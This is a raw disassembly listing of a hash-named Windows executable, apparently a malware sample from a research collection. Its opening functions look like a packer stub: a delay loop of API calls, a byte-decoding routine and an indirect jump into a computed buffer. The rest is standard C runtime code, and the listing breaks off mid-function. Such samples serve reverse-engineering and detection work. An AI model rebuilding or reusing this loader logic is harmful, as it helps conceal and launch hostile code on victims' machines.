
b706e5a36eefa631831fc4c65bdc8b28d51ed3a261fe54f1c281ecf9da87a133.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	pop    ebp
  401004:	ret    
  401005:	push   ebp
  401006:	mov    ebp,esp
  401008:	sub    esp,0x10
  40100b:	mov    DWORD PTR [ebp-0x4],0x0
  401012:	mov    DWORD PTR [ebp-0xc],0x0
  401019:	push   0x0
  40101b:	push   0x0
  40101d:	push   0x0
  40101f:	call   DWORD PTR ds:0x426004
  401025:	mov    DWORD PTR [ebp-0x10],0x0
  40102c:	mov    DWORD PTR [ebp-0x10],0x0
  401033:	jmp    0x40103e
  401035:	mov    eax,DWORD PTR [ebp-0x10]
  401038:	add    eax,0x1
  40103b:	mov    DWORD PTR [ebp-0x10],eax
  40103e:	cmp    DWORD PTR [ebp-0x10],0x3e8
  401045:	jge    0x40105c
  401047:	call   DWORD PTR ds:0x426000
  40104d:	mov    DWORD PTR [ebp-0x4],eax
  401050:	push   0x0
  401052:	call   0x4013a1
  401057:	add    esp,0x4
  40105a:	jmp    0x401035
  40105c:	mov    DWORD PTR [ebp-0x8],0x0
  401063:	cmp    DWORD PTR [ebp-0x4],0xde
  40106a:	jb     0x401078
  40106c:	push   0x0
  40106e:	push   0x0
  401070:	call   0x4011a6
  401075:	add    esp,0x8
  401078:	xor    eax,eax
  40107a:	mov    esp,ebp
  40107c:	pop    ebp
  40107d:	ret    
  40107e:	push   ebp
  40107f:	mov    ebp,esp
  401081:	sub    esp,0x8
  401084:	mov    DWORD PTR [ebp-0x4],0x0
  40108b:	mov    eax,DWORD PTR [ebp+0x8]
  40108e:	mov    DWORD PTR [ebp-0x4],eax
  401091:	mov    DWORD PTR [ebp-0x8],0xa
  401098:	push   0x0
  40109a:	call   DWORD PTR ds:0x4260e8
  4010a0:	push   0x0
  4010a2:	push   0x0
  4010a4:	push   0x0
  4010a6:	call   0x4013ac
  4010ab:	add    esp,0xc
  4010ae:	xor    eax,eax
  4010b0:	mov    esp,ebp
  4010b2:	pop    ebp
  4010b3:	ret    
  4010b4:	push   ebp
  4010b5:	mov    ebp,esp
  4010b7:	sub    esp,0x2c
  4010ba:	mov    DWORD PTR [ebp-0x24],0x0
  4010c1:	mov    DWORD PTR [ebp-0x4],0x0
  4010c8:	mov    DWORD PTR [ebp-0x1c],0x0
  4010cf:	mov    BYTE PTR [ebp-0x9],0x0
  4010d3:	mov    DWORD PTR [ebp-0x8],0x0
  4010da:	mov    eax,DWORD PTR [ebp+0x8]
  4010dd:	mov    DWORD PTR [ebp-0x14],eax
  4010e0:	mov    DWORD PTR [ebp-0x20],0x0
  4010e7:	lea    ecx,[ebp-0x9]
  4010ea:	mov    DWORD PTR [ebp-0x18],ecx
  4010ed:	mov    DWORD PTR [ebp-0x28],0x0
  4010f4:	mov    DWORD PTR [ebp-0x10],0x0
  4010fb:	mov    DWORD PTR [ebp-0x2c],0x0
  401102:	mov    edx,DWORD PTR [ebp+0x10]
  401105:	mov    DWORD PTR [ebp-0x4],edx
  401108:	push   0x0
  40110a:	call   DWORD PTR ds:0x426010
  401110:	mov    eax,DWORD PTR [ebp-0x18]
  401113:	mov    ecx,DWORD PTR [ebp-0x14]
  401116:	mov    dl,BYTE PTR [ecx]
  401118:	mov    BYTE PTR [eax],dl
  40111a:	mov    eax,DWORD PTR [ebp-0x4]
  40111d:	add    eax,DWORD PTR [ebp-0x8]
  401120:	mov    BYTE PTR [eax],0x0
  401123:	mov    ecx,DWORD PTR [ebp-0x9]
  401126:	and    ecx,0xff
  40112c:	push   ecx
  40112d:	lea    edx,[ebp-0x20]
  401130:	push   edx
  401131:	call   DWORD PTR ds:0x42600c
  401137:	mov    eax,DWORD PTR [ebp-0x20]
  40113a:	add    eax,0x14
  40113d:	push   eax
  40113e:	lea    ecx,[ebp-0x20]
  401141:	push   ecx
  401142:	call   DWORD PTR ds:0x42600c
  401148:	mov    dl,BYTE PTR [ebp-0x20]
  40114b:	mov    BYTE PTR [ebp-0x9],dl
  40114e:	push   0x4
  401150:	lea    eax,[ebp-0x9]
  401153:	push   eax
  401154:	lea    ecx,[ebp-0x2c]
  401157:	push   ecx
  401158:	call   0x4013d0
  40115d:	add    esp,0xc
  401160:	mov    edx,DWORD PTR [ebp-0x4]
  401163:	add    edx,DWORD PTR [ebp-0x8]
  401166:	mov    al,BYTE PTR [ebp-0x9]
  401169:	mov    BYTE PTR [edx],al
  40116b:	mov    ecx,DWORD PTR [ebp-0x14]
  40116e:	add    ecx,0x1
  401171:	mov    DWORD PTR [ebp-0x14],ecx
  401174:	lea    edx,[ebp-0x8]
  401177:	push   edx
  401178:	call   DWORD PTR ds:0x426008
  40117e:	mov    eax,DWORD PTR [ebp-0x8]
  401181:	cmp    eax,DWORD PTR [ebp+0xc]
  401184:	jb     0x401102
  40118a:	mov    esp,ebp
  40118c:	pop    ebp
  40118d:	ret    
  40118e:	push   ebp
  40118f:	mov    ebp,esp
  401191:	push   ecx
  401192:	mov    DWORD PTR [ebp-0x4],0x0
  401199:	call   0x401005
  40119e:	xor    eax,eax
  4011a0:	mov    esp,ebp
  4011a2:	pop    ebp
  4011a3:	ret    0x10
  4011a6:	push   ebp
  4011a7:	mov    ebp,esp
  4011a9:	sub    esp,0x98
  4011af:	push   ebx
  4011b0:	push   esi
  4011b1:	mov    DWORD PTR [ebp-0x98],0x0
  4011bb:	mov    DWORD PTR [ebp-0x78],0x0
  4011c2:	mov    DWORD PTR [ebp-0x70],0x0
  4011c9:	mov    DWORD PTR [ebp-0x94],0x0
  4011d3:	mov    DWORD PTR [ebp-0x10],0x0
  4011da:	mov    DWORD PTR [ebp-0x68],0x0
  4011e1:	mov    DWORD PTR [ebp-0xc],0x0
  4011e8:	mov    DWORD PTR [ebp-0x4],0x0
  4011ef:	mov    DWORD PTR [ebp-0x80],0x0
  4011f6:	mov    DWORD PTR [ebp-0x74],0x0
  4011fd:	mov    DWORD PTR [ebp-0x8],0x0
  401204:	mov    DWORD PTR [ebp-0x6c],0x69c20eb2
  40120b:	mov    DWORD PTR [ebp-0x7c],0x0
  401212:	mov    DWORD PTR [ebp-0x8c],0x0
  40121c:	mov    DWORD PTR [ebp-0x64],0x0
  401223:	mov    DWORD PTR [ebp-0x88],0x0
  40122d:	mov    eax,ds:0x42602c
  401232:	mov    DWORD PTR [ebp-0x84],eax
  401238:	mov    DWORD PTR [ebp-0x90],0x0
  401242:	push   0x0
  401244:	call   DWORD PTR ds:0x426028
  40124a:	mov    DWORD PTR [ebp-0x94],0x1ece6
  401254:	mov    ebx,0x0
  401259:	push   ebx
  40125a:	push   ebx
  40125b:	mov    ebx,eax
  40125d:	push   0x0
  40125f:	call   DWORD PTR ds:0x426024
  401265:	mov    DWORD PTR [ebp-0x78],0x3a
  40126c:	mov    ecx,DWORD PTR ds:0x426020
  401272:	mov    DWORD PTR [ebp+0xc],ecx
  401275:	cmp    DWORD PTR [ebp+0xc],0x0
  401279:	je     0x40130f
  40127f:	push   0x0
  401281:	push   0x0
  401283:	push   0x0
  401285:	push   0x0
  401287:	push   0x0
  401289:	call   DWORD PTR ds:0x42601c
  40128f:	mov    edx,DWORD PTR [ebp-0x94]
  401295:	add    edx,0x21ea
  40129b:	mov    DWORD PTR [ebp-0x94],edx
  4012a1:	mov    DWORD PTR [ebp-0x8],0x500
  4012a8:	call   DWORD PTR ds:0x426018
  4012ae:	mov    ecx,DWORD PTR [ebp-0x94]
  4012b4:	add    ecx,eax
  4012b6:	mov    DWORD PTR [ebp-0x94],ecx
  4012bc:	mov    DWORD PTR [ebp-0x80],0x0
  4012c3:	cmp    DWORD PTR [ebp-0x94],0x0
  4012ca:	jbe    0x4012df
  4012cc:	mov    edx,DWORD PTR [ebp-0x8]
  4012cf:	add    edx,0xb00
  4012d5:	mov    DWORD PTR [ebp-0x8],edx
  4012d8:	mov    DWORD PTR [ebp-0xc],0x18ba
  4012df:	mov    ebx,DWORD PTR [ebp+0xc]
  4012e2:	mov    eax,DWORD PTR [ebp-0x80]
  4012e5:	add    eax,0x2
  4012e8:	mov    DWORD PTR [ebp-0x80],eax
  4012eb:	mov    ecx,DWORD PTR [ebp-0x80]
  4012ee:	add    ecx,0x2
  4012f1:	mov    DWORD PTR [ebp-0x80],ecx
  4012f4:	push   DWORD PTR [ebp-0x80]
  4012f7:	push   DWORD PTR [ebp-0x8]
  4012fa:	mov    eax,0x0
  4012ff:	push   0x2769
  401304:	push   eax
  401305:	push   ebx
  401306:	pop    DWORD PTR [ebp-0x5b]
  401309:	call   DWORD PTR [ebp-0x5b]
  40130c:	mov    DWORD PTR [ebp+0xc],eax
  40130f:	push   0x0
  401311:	push   0x0
  401313:	call   DWORD PTR ds:0x4260fc
  401319:	push   DWORD PTR [ebp-0x84]
  40131f:	call   DWORD PTR ds:0x426000
  401325:	mov    edx,DWORD PTR ds:0x426014
  40132b:	mov    DWORD PTR [ebp-0x70],edx
  40132e:	mov    DWORD PTR [ebp-0x64],0x400000
  401335:	mov    eax,DWORD PTR [ebp+0xc]
  401338:	mov    DWORD PTR [ebp-0x74],eax
  40133b:	pop    DWORD PTR [ebp-0x98]
  401341:	mov    ecx,DWORD PTR [ebp+0xc]
  401344:	add    ecx,DWORD PTR [ebp-0x78]
  401347:	mov    DWORD PTR [ebp-0x7c],ecx
  40134a:	mov    edx,DWORD PTR [ebp-0x64]
  40134d:	mov    DWORD PTR [ebp-0x68],edx
  401350:	mov    eax,DWORD PTR [ebp-0x94]
  401356:	mov    ecx,DWORD PTR [ebp-0x68]
  401359:	lea    edx,[ecx+eax*1+0xa]
  40135d:	mov    DWORD PTR [ebp-0x68],edx
  401360:	push   0x0
  401362:	push   0x0
  401364:	call   DWORD PTR ds:0x4260f0
  40136a:	push   0x425644
  40136f:	push   0x0
  401371:	call   DWORD PTR ds:0x4260f4
  401377:	mov    eax,DWORD PTR [ebp-0x74]
  40137a:	push   eax
  40137b:	mov    ecx,DWORD PTR [ebp-0xc]
  40137e:	push   ecx
  40137f:	mov    edx,DWORD PTR [ebp-0x68]
  401382:	push   edx
  401383:	call   0x4010b4
  401388:	add    esp,0xc
  40138b:	push   DWORD PTR [ebp-0x70]
  40138e:	push   DWORD PTR [ebp-0x98]
  401394:	mov    esi,DWORD PTR [ebp-0x7c]
  401397:	call   esi
  401399:	xor    eax,eax
  40139b:	pop    esi
  40139c:	pop    ebx
  40139d:	mov    esp,ebp
  40139f:	pop    ebp
  4013a0:	ret    
  4013a1:	mov    eax,DWORD PTR [esp+0x4]
  4013a5:	test   eax,eax
  4013a7:	jge    0x4013ab
  4013a9:	neg    eax
  4013ab:	ret    
  4013ac:	lea    eax,[esp+0xc]
  4013b0:	push   eax
  4013b1:	push   DWORD PTR [esp+0xc]
  4013b5:	push   DWORD PTR [esp+0xc]
  4013b9:	call   0x401953
  4013be:	add    esp,0xc
  4013c1:	ret    
  4013c2:	int3   
  4013c3:	int3   
  4013c4:	int3   
  4013c5:	int3   
  4013c6:	int3   
  4013c7:	int3   
  4013c8:	int3   
  4013c9:	int3   
  4013ca:	int3   
  4013cb:	int3   
  4013cc:	int3   
  4013cd:	int3   
  4013ce:	int3   
  4013cf:	int3   
  4013d0:	push   ebp
  4013d1:	mov    ebp,esp
  4013d3:	push   edi
  4013d4:	push   esi
  4013d5:	mov    esi,DWORD PTR [ebp+0xc]
  4013d8:	mov    ecx,DWORD PTR [ebp+0x10]
  4013db:	mov    edi,DWORD PTR [ebp+0x8]
  4013de:	mov    eax,ecx
  4013e0:	mov    edx,ecx
  4013e2:	add    eax,esi
  4013e4:	cmp    edi,esi
  4013e6:	jbe    0x4013f0
  4013e8:	cmp    edi,eax
  4013ea:	jb     0x40156c
  4013f0:	test   edi,0x3
  4013f6:	jne    0x40140c
  4013f8:	shr    ecx,0x2
  4013fb:	and    edx,0x3
  4013fe:	cmp    ecx,0x8
  401401:	jb     0x40142c
  401403:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401405:	jmp    DWORD PTR [edx*4+0x40151c]
  40140c:	mov    eax,edi
  40140e:	mov    edx,0x3
  401413:	sub    ecx,0x4
  401416:	jb     0x401424
  401418:	and    eax,0x3
  40141b:	add    ecx,eax
  40141d:	jmp    DWORD PTR [eax*4+0x401430]
  401424:	jmp    DWORD PTR [ecx*4+0x40152c]
  40142b:	nop
  40142c:	jmp    DWORD PTR [ecx*4+0x4014b0]
  401433:	nop
  401434:	inc    eax
  401435:	adc    al,0x40
  401437:	add    BYTE PTR [esp+edx*1+0x40],ch
  40143b:	add    BYTE PTR [eax+0x23004014],dl
  401441:	ror    DWORD PTR [edx-0x75f877fa],1
  401447:	inc    esi
  401448:	add    DWORD PTR [eax+0x468a0147],ecx
  40144e:	add    al,cl
  401450:	jmp    0x2879c57
  401455:	add    esi,0x3
  401458:	add    edi,0x3
  40145b:	cmp    ecx,0x8
  40145e:	jb     0x40142c
  401460:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401462:	jmp    DWORD PTR [edx*4+0x40151c]
  401469:	lea    ecx,[ecx+0x0]
  40146c:	and    edx,ecx
  40146e:	mov    al,BYTE PTR [esi]
  401470:	mov    BYTE PTR [edi],al
  401472:	mov    al,BYTE PTR [esi+0x1]
  401475:	shr    ecx,0x2
  401478:	mov    BYTE PTR [edi+0x1],al
  40147b:	add    esi,0x2
  40147e:	add    edi,0x2
  401481:	cmp    ecx,0x8
  401484:	jb     0x40142c
  401486:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401488:	jmp    DWORD PTR [edx*4+0x40151c]
  40148f:	nop
  401490:	and    edx,ecx
  401492:	mov    al,BYTE PTR [esi]
  401494:	mov    BYTE PTR [edi],al
  401496:	add    esi,0x1
  401499:	shr    ecx,0x2
  40149c:	add    edi,0x1
  40149f:	cmp    ecx,0x8
  4014a2:	jb     0x40142c
  4014a4:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4014a6:	jmp    DWORD PTR [edx*4+0x40151c]
  4014ad:	lea    ecx,[ecx+0x0]
  4014b0:	adc    edx,DWORD PTR ds:0x15000040
  4014b6:	inc    eax
  4014b7:	add    al,bh
  4014b9:	adc    al,0x40
  4014bb:	add    al,dh
  4014bd:	adc    al,0x40
  4014bf:	add    al,ch
  4014c1:	adc    al,0x40
  4014c3:	add    al,ah
  4014c5:	adc    al,0x40
  4014c7:	add    al,bl
  4014c9:	adc    al,0x40
  4014cb:	add    al,dl
  4014cd:	adc    al,0x40
  4014cf:	add    BYTE PTR [ebx-0x761b71bc],cl
  4014d5:	inc    esp
  4014d6:	(bad)  
  4014d7:	in     al,0x8b
  4014d9:	inc    esp
  4014da:	mov    gs,eax
  4014dc:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  4014e0:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  4014e4:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  4014e8:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  4014ec:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  4014f0:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  4014f4:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  4014f8:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  4014fc:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  401500:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  401504:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  401508:	lea    eax,[ecx*4+0x0]
  40150f:	add    esi,eax
  401511:	add    edi,eax
  401513:	jmp    DWORD PTR [edx*4+0x40151c]
  40151a:	mov    edi,edi
  40151c:	sub    al,0x15
  40151e:	inc    eax
  40151f:	add    BYTE PTR [edx*1+0x15400040],dh
  401526:	inc    eax
  401527:	add    BYTE PTR [ebp+edx*1+0x40],dl
  40152b:	add    BYTE PTR [ebx+0x5f5e0845],cl
  401531:	leave  
  401532:	ret    
  401533:	nop
  401534:	mov    al,BYTE PTR [esi]
  401536:	mov    BYTE PTR [edi],al
  401538:	mov    eax,DWORD PTR [ebp+0x8]
  40153b:	pop    esi
  40153c:	pop    edi
  40153d:	leave  
  40153e:	ret    
  40153f:	nop
  401540:	mov    al,BYTE PTR [esi]
  401542:	mov    BYTE PTR [edi],al
  401544:	mov    al,BYTE PTR [esi+0x1]
  401547:	mov    BYTE PTR [edi+0x1],al
  40154a:	mov    eax,DWORD PTR [ebp+0x8]
  40154d:	pop    esi
  40154e:	pop    edi
  40154f:	leave  
  401550:	ret    
  401551:	lea    ecx,[ecx+0x0]
  401554:	mov    al,BYTE PTR [esi]
  401556:	mov    BYTE PTR [edi],al
  401558:	mov    al,BYTE PTR [esi+0x1]
  40155b:	mov    BYTE PTR [edi+0x1],al
  40155e:	mov    al,BYTE PTR [esi+0x2]
  401561:	mov    BYTE PTR [edi+0x2],al
  401564:	mov    eax,DWORD PTR [ebp+0x8]
  401567:	pop    esi
  401568:	pop    edi
  401569:	leave  
  40156a:	ret    
  40156b:	nop
  40156c:	lea    esi,[ecx+esi*1-0x4]
  401570:	lea    edi,[ecx+edi*1-0x4]
  401574:	test   edi,0x3
  40157a:	jne    0x4015a0
  40157c:	shr    ecx,0x2
  40157f:	and    edx,0x3
  401582:	cmp    ecx,0x8
  401585:	jb     0x401594
  401587:	std    
  401588:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40158a:	cld    
  40158b:	jmp    DWORD PTR [edx*4+0x4016b8]
  401592:	mov    edi,edi
  401594:	neg    ecx
  401596:	jmp    DWORD PTR [ecx*4+0x401668]
  40159d:	lea    ecx,[ecx+0x0]
  4015a0:	mov    eax,edi
  4015a2:	mov    edx,0x3
  4015a7:	cmp    ecx,0x4
  4015aa:	jb     0x4015b8
  4015ac:	and    eax,0x3
  4015af:	sub    ecx,eax
  4015b1:	jmp    DWORD PTR [eax*4+0x4015bc]
  4015b8:	jmp    DWORD PTR [ecx*4+0x4016b8]
  4015bf:	nop
  4015c0:	int3   
  4015c1:	adc    eax,0x15f00040
  4015c6:	inc    eax
  4015c7:	add    BYTE PTR [eax],bl
  4015c9:	push   ss
  4015ca:	inc    eax
  4015cb:	add    BYTE PTR [edx-0x2edcfcba],cl
  4015d1:	mov    BYTE PTR [edi+0x3],al
  4015d4:	sub    esi,0x1
  4015d7:	shr    ecx,0x2
  4015da:	sub    edi,0x1
  4015dd:	cmp    ecx,0x8
  4015e0:	jb     0x401594
  4015e2:	std    
  4015e3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4015e5:	cld    
  4015e6:	jmp    DWORD PTR [edx*4+0x4016b8]
  4015ed:	lea    ecx,[ecx+0x0]
  4015f0:	mov    al,BYTE PTR [esi+0x3]
  4015f3:	and    edx,ecx
  4015f5:	mov    BYTE PTR [edi+0x3],al
  4015f8:	mov    al,BYTE PTR [esi+0x2]
  4015fb:	shr    ecx,0x2
  4015fe:	mov    BYTE PTR [edi+0x2],al
  401601:	sub    esi,0x2
  401604:	sub    edi,0x2
  401607:	cmp    ecx,0x8
  40160a:	jb     0x401594
  40160c:	std    
  40160d:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40160f:	cld    
  401610:	jmp    DWORD PTR [edx*4+0x4016b8]
  401617:	nop
  401618:	mov    al,BYTE PTR [esi+0x3]
  40161b:	and    edx,ecx
  40161d:	mov    BYTE PTR [edi+0x3],al
  401620:	mov    al,BYTE PTR [esi+0x2]
  401623:	mov    BYTE PTR [edi+0x2],al
  401626:	mov    al,BYTE PTR [esi+0x1]
  401629:	shr    ecx,0x2
  40162c:	mov    BYTE PTR [edi+0x1],al
  40162f:	sub    esi,0x3
  401632:	sub    edi,0x3
  401635:	cmp    ecx,0x8
  401638:	jb     0x401594
  40163e:	std    
  40163f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401641:	cld    
  401642:	jmp    DWORD PTR [edx*4+0x4016b8]
  401649:	lea    ecx,[ecx+0x0]
  40164c:	ins    BYTE PTR es:[edi],dx
  40164d:	push   ss
  40164e:	inc    eax
  40164f:	add    BYTE PTR [esi+edx*1+0x40],dh
  401653:	add    BYTE PTR [esi+edx*1+0x40],bh
  401657:	add    BYTE PTR [esi+edx*1+0x168c0040],al
  40165e:	inc    eax
  40165f:	add    BYTE PTR [esi+edx*1+0x169c0040],dl
  401666:	inc    eax
  401667:	add    BYTE PTR [edi-0x74ffbfea],ch
  40166d:	inc    esp
  40166e:	mov    ds,WORD PTR [ecx+ecx*4]
  401671:	inc    esp
  401672:	(bad)  
  401673:	sbb    al,0x8b
  401675:	inc    esp
  401676:	mov    ds,WORD PTR [eax]
  401678:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  40167c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  401680:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  401684:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  401688:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  40168c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  401690:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  401694:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  401698:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  40169c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  4016a0:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  4016a4:	lea    eax,[ecx*4+0x0]
  4016ab:	add    esi,eax
  4016ad:	add    edi,eax
  4016af:	jmp    DWORD PTR [edx*4+0x4016b8]
  4016b6:	mov    edi,edi
  4016b8:	enter  0x4016,0x0
  4016bc:	rcl    BYTE PTR [esi],1
  4016be:	inc    eax
  4016bf:	add    al,ah
  4016c1:	push   ss
  4016c2:	inc    eax
  4016c3:	add    ah,dh
  4016c5:	push   ss
  4016c6:	inc    eax
  4016c7:	add    BYTE PTR [ebx+0x5f5e0845],cl
  4016cd:	leave  
  4016ce:	ret    
  4016cf:	nop
  4016d0:	mov    al,BYTE PTR [esi+0x3]
  4016d3:	mov    BYTE PTR [edi+0x3],al
  4016d6:	mov    eax,DWORD PTR [ebp+0x8]
  4016d9:	pop    esi
  4016da:	pop    edi
  4016db:	leave  
  4016dc:	ret    
  4016dd:	lea    ecx,[ecx+0x0]
  4016e0:	mov    al,BYTE PTR [esi+0x3]
  4016e3:	mov    BYTE PTR [edi+0x3],al
  4016e6:	mov    al,BYTE PTR [esi+0x2]
  4016e9:	mov    BYTE PTR [edi+0x2],al
  4016ec:	mov    eax,DWORD PTR [ebp+0x8]
  4016ef:	pop    esi
  4016f0:	pop    edi
  4016f1:	leave  
  4016f2:	ret    
  4016f3:	nop
  4016f4:	mov    al,BYTE PTR [esi+0x3]
  4016f7:	mov    BYTE PTR [edi+0x3],al
  4016fa:	mov    al,BYTE PTR [esi+0x2]
  4016fd:	mov    BYTE PTR [edi+0x2],al
  401700:	mov    al,BYTE PTR [esi+0x1]
  401703:	mov    BYTE PTR [edi+0x1],al
  401706:	mov    eax,DWORD PTR [ebp+0x8]
  401709:	pop    esi
  40170a:	pop    edi
  40170b:	leave  
  40170c:	ret    
  40170d:	cmp    DWORD PTR ds:0x4287c8,0x1
  401714:	jne    0x40171b
  401716:	call   0x4027fb
  40171b:	push   DWORD PTR [esp+0x4]
  40171f:	call   0x402684
  401724:	push   0xff
  401729:	call   DWORD PTR ds:0x428140
  40172f:	pop    ecx
  401730:	pop    ecx
  401731:	ret    
  401732:	push   0x60
  401734:	push   0x426130
  401739:	call   0x4030a4
  40173e:	mov    edi,0x94
  401743:	mov    eax,edi
  401745:	call   0x4030f0
  40174a:	mov    DWORD PTR [ebp-0x18],esp
  40174d:	mov    esi,esp
  40174f:	mov    DWORD PTR [esi],edi
  401751:	push   esi
  401752:	call   DWORD PTR ds:0x426054
  401758:	mov    ecx,DWORD PTR [esi+0x10]
  40175b:	mov    DWORD PTR ds:0x4287d8,ecx
  401761:	mov    eax,DWORD PTR [esi+0x4]
  401764:	mov    ds:0x4287e4,eax
  401769:	mov    edx,DWORD PTR [esi+0x8]
  40176c:	mov    DWORD PTR ds:0x4287e8,edx
  401772:	mov    esi,DWORD PTR [esi+0xc]
  401775:	and    esi,0x7fff
  40177b:	mov    DWORD PTR ds:0x4287dc,esi
  401781:	cmp    ecx,0x2
  401784:	je     0x401792
  401786:	or     esi,0x8000
  40178c:	mov    DWORD PTR ds:0x4287dc,esi
  401792:	shl    eax,0x8
  401795:	add    eax,edx
  401797:	mov    ds:0x4287e0,eax
  40179c:	xor    esi,esi
  40179e:	push   esi
  40179f:	mov    edi,DWORD PTR ds:0x42602c
  4017a5:	call   edi
  4017a7:	cmp    WORD PTR [eax],0x5a4d
  4017ac:	jne    0x4017cd
  4017ae:	mov    ecx,DWORD PTR [eax+0x3c]
  4017b1:	add    ecx,eax
  4017b3:	cmp    DWORD PTR [ecx],0x4550
  4017b9:	jne    0x4017cd
  4017bb:	movzx  eax,WORD PTR [ecx+0x18]
  4017bf:	cmp    eax,0x10b
  4017c4:	je     0x4017e5
  4017c6:	cmp    eax,0x20b
  4017cb:	je     0x4017d2
  4017cd:	mov    DWORD PTR [ebp-0x1c],esi
  4017d0:	jmp    0x4017f9
  4017d2:	cmp    DWORD PTR [ecx+0x84],0xe
  4017d9:	jbe    0x4017cd
  4017db:	xor    eax,eax
  4017dd:	cmp    DWORD PTR [ecx+0xf8],esi
  4017e3:	jmp    0x4017f3
  4017e5:	cmp    DWORD PTR [ecx+0x74],0xe
  4017e9:	jbe    0x4017cd
  4017eb:	xor    eax,eax
  4017ed:	cmp    DWORD PTR [ecx+0xe8],esi
  4017f3:	setne  al
  4017f6:	mov    DWORD PTR [ebp-0x1c],eax
  4017f9:	push   esi
  4017fa:	call   0x403052
  4017ff:	pop    ecx
  401800:	test   eax,eax
  401802:	jne    0x401825
  401804:	cmp    DWORD PTR ds:0x4287c8,0x1
  40180b:	jne    0x401812
  40180d:	call   0x4027fb
  401812:	push   0x1c
  401814:	call   0x402684
  401819:	push   0xff
  40181e:	call   0x4024ed
  401823:	pop    ecx
  401824:	pop    ecx
  401825:	call   0x402fb0
  40182a:	mov    DWORD PTR [ebp-0x4],esi
  40182d:	call   0x402e05
  401832:	test   eax,eax
  401834:	jge    0x40183e
  401836:	push   0x1b
  401838:	call   0x40170d
  40183d:	pop    ecx
  40183e:	call   DWORD PTR ds:0x426050
  401844:	mov    ds:0x429d34,eax
  401849:	call   0x402ce3
  40184e:	mov    ds:0x4287c0,eax
  401853:	call   0x402c41
  401858:	test   eax,eax
  40185a:	jge    0x401864
  40185c:	push   0x8
  40185e:	call   0x40170d
  401863:	pop    ecx
  401864:	call   0x402a0e
  401869:	test   eax,eax
  40186b:	jge    0x401875
  40186d:	push   0x9
  40186f:	call   0x40170d
  401874:	pop    ecx
  401875:	call   0x40251d
  40187a:	mov    DWORD PTR [ebp-0x20],eax
  40187d:	cmp    eax,esi
  40187f:	je     0x401888
  401881:	push   eax
  401882:	call   0x40170d
  401887:	pop    ecx
  401888:	mov    DWORD PTR [ebp-0x38],esi
  40188b:	lea    eax,[ebp-0x64]
  40188e:	push   eax
  40188f:	call   DWORD PTR ds:0x42604c
  401895:	call   0x4029a5
  40189a:	mov    DWORD PTR [ebp-0x68],eax
  40189d:	test   BYTE PTR [ebp-0x38],0x1
  4018a1:	je     0x4018a9
  4018a3:	movzx  eax,WORD PTR [ebp-0x34]
  4018a7:	jmp    0x4018ac
  4018a9:	push   0xa
  4018ab:	pop    eax
  4018ac:	push   eax
  4018ad:	push   DWORD PTR [ebp-0x68]
  4018b0:	push   esi
  4018b1:	push   esi
  4018b2:	call   edi
  4018b4:	push   eax
  4018b5:	call   0x40118e
  4018ba:	mov    edi,eax
  4018bc:	mov    DWORD PTR [ebp-0x6c],edi
  4018bf:	cmp    DWORD PTR [ebp-0x1c],esi
  4018c2:	jne    0x4018ca
  4018c4:	push   edi
  4018c5:	call   0x402644
  4018ca:	call   0x402666
  4018cf:	jmp    0x4018fc
  4018d1:	mov    eax,DWORD PTR [ebp-0x14]
  4018d4:	mov    ecx,DWORD PTR [eax]
  4018d6:	mov    ecx,DWORD PTR [ecx]
  4018d8:	mov    DWORD PTR [ebp-0x70],ecx
  4018db:	push   eax
  4018dc:	push   ecx
  4018dd:	call   0x402834
  4018e2:	pop    ecx
  4018e3:	pop    ecx
  4018e4:	ret    
  4018e5:	mov    esp,DWORD PTR [ebp-0x18]
  4018e8:	mov    edi,DWORD PTR [ebp-0x70]
  4018eb:	cmp    DWORD PTR [ebp-0x1c],0x0
  4018ef:	jne    0x4018f7
  4018f1:	push   edi
  4018f2:	call   0x402655
  4018f7:	call   0x402675
  4018fc:	or     DWORD PTR [ebp-0x4],0xffffffff
  401900:	mov    eax,edi
  401902:	lea    esp,[ebp-0x7c]
  401905:	call   0x4030df
  40190a:	ret    
  40190b:	cmp    DWORD PTR ds:0x428278,0x1
  401912:	push   esi
  401913:	mov    esi,eax
  401915:	jle    0x401923
  401917:	push   0x4
  401919:	push   esi
  40191a:	call   0x40312d
  40191f:	pop    ecx
  401920:	pop    ecx
  401921:	jmp    0x40192f
  401923:	mov    eax,ds:0x428270
  401928:	movzx  eax,BYTE PTR [eax+esi*2]
  40192c:	and    eax,0x4
  40192f:	test   eax,eax
  401931:	jne    0x401939
  401933:	and    esi,0xffffffdf
  401936:	sub    esi,0x7
  401939:	mov    eax,esi
  40193b:	pop    esi
  40193c:	ret    
  40193d:	dec    DWORD PTR [edx+0x4]
  401940:	js     0x40194b
  401942:	mov    ecx,DWORD PTR [edx]
  401944:	movzx  eax,BYTE PTR [ecx]
  401947:	inc    ecx
  401948:	mov    DWORD PTR [edx],ecx
